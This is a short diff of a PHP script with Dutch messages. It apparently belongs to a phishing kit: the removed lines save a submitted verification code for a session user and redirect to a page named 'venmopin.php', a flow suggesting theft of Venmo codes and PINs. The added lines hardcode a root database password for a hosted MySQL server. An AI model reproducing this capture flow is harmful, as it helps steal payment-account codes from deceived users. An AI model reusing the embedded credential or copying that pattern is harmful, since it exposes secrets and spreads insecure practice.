@@ -1,28 +1,8 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $conn = new mysqli('localhost', 'root', '', 'my_base');
-    if ($conn->connect_error) {
-        die("Connectie mislukt: " . $conn->connect_error);
-    }
-
-    $code = $_POST['code'] ?? '';
-    $user_id = $_SESSION['user_flow_id'] ?? null;
-
-    if (!empty($code) && $user_id) {
-        $stmt = $conn->prepare("UPDATE user_flow SET verification_code = ? WHERE id = ?");
-        $stmt->bind_param("si", $code, $user_id);
-        $stmt->execute();
-
-        $stmt->close();
-        $conn->close();
-
-        header("Location: venmopin.php");
-        exit();
-    } else {
-        echo "Code of sessie-ID ontbreekt.";
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
 
